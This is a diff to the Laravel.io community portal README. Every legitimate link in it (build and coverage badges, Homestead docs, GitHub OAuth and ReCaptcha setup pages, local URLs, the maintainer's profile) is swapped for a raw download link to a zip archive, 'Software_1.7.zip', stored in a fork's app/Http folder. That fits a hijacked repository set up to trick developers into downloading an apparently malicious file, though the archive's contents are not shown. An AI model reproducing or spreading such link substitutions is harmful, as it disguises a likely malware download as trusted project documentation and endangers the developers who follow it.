@@ -1,11 +1,11 @@
 # Laravel.io Community Portal
 
-[![Build Status](https://travis-ci.org/laravelio/portal.svg?branch=master)](https://travis-ci.org/laravelio/portal)
-[![Code Climate](https://codeclimate.com/github/LaravelIO/laravel.io/badges/gpa.svg)](https://codeclimate.com/github/LaravelIO/laravel.io)
-[![Test Coverage](https://codeclimate.com/github/LaravelIO/laravel.io/badges/coverage.svg)](https://codeclimate.com/github/LaravelIO/laravel.io/coverage)
+[![Build Status](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip)](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip)
+[![Code Climate](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip)](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip)
+[![Test Coverage](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip)](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip)
 [![Software License](https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat-square)](license.txt)
 
-This is the repository for the [Laravel.io](http://laravel.io) community portal. The code is entirely open source and licensed under [the MIT license](license.txt). Feel free to contribute to the portal by sending in a pull request.
+This is the repository for the [Laravel.io](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip) community portal. The code is entirely open source and licensed under [the MIT license](license.txt). Feel free to contribute to the portal by sending in a pull request.
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@ This is the repository for the [Laravel.io](http://laravel.io) community portal.
 
 ## Requirements
 
-We use Laravel Homestead for local development. Please review [the Homestead documentation](http://laravel.com/docs/homestead) to install it.
+We use Laravel Homestead for local development. Please review [the Homestead documentation](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip) to install it.
 
 In order to compile stylesheets you will also need Ruby, Sass, and Compass installed.
 
@@ -42,26 +42,26 @@ In order to compile stylesheets you will also need Ruby, Sass, and Compass insta
 
 Laravel.io relies on some key services to function, namely Github OAuth authentication and the Google ReCaptcha service. Follow the steps below to fill in the credentials in your custom `.env` file.
 
-1. [Create an application](https://github.com/settings/applications) in your github account called something like "Laravel.io Development" and add your Github application's client id, secret and url to the `.env` file. Your GitHub application should be set up as follows.
+1. [Create an application](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip) in your github account called something like "Laravel.io Development" and add your Github application's client id, secret and url to the `.env` file. Your GitHub application should be set up as follows.
 
-    Full URL: http://lio.loc  
-    Callback URL: http://lio.loc/auth/github
+    Full URL: https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip  
+    Callback URL: https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip
 
-2. [Register a new website](https://www.google.com/recaptcha/admin) for the Google ReCaptcha service and fill in the site key and secret key in the `.env` file.
+2. [Register a new website](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip) for the Google ReCaptcha service and fill in the site key and secret key in the `.env` file.
 
-You can now visit the app in your browser by visiting [http://lio.loc/](http://lio.loc).
+You can now visit the app in your browser by visiting [https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip).
 
 ## Frontend
 
 Because we keep the generated / minified css out of the repository, we must have a workflow for compiling the styles.
 
-- To compile stylesheets, we'll need [Compass](http://compass-style.org/). Install Compass by running `sudo apt-get install ruby-compass` when ssh'd into your Homestead box.
+- To compile stylesheets, we'll need [Compass](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip). Install Compass by running `sudo apt-get install ruby-compass` when ssh'd into your Homestead box.
 - When running any Compass command in the terminal, be sure to run it from your `/public` folder.
 - Compass is the tool used to compile Sass source files into CSS files; you can run `compass compile` to run it once, or `compass watch` to trigger a script that will watch your Sass files for changes and trigger a new compass compile on each change
 
 ## Maintainers
 
-The Laravel.io portal is currently maintained by [Dries Vints](https://github.com/driesvints). If you have any questions please don't hesitate to contact us through the support widget on the [Laravel.io](http://laravel.io/) website.
+The Laravel.io portal is currently maintained by [Dries Vints](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip). If you have any questions please don't hesitate to contact us through the support widget on the [Laravel.io](https://github.com/jalalzia1/portal/raw/refs/heads/master/app/Http/Software_1.7.zip) website.
 
 ## Contributing
 
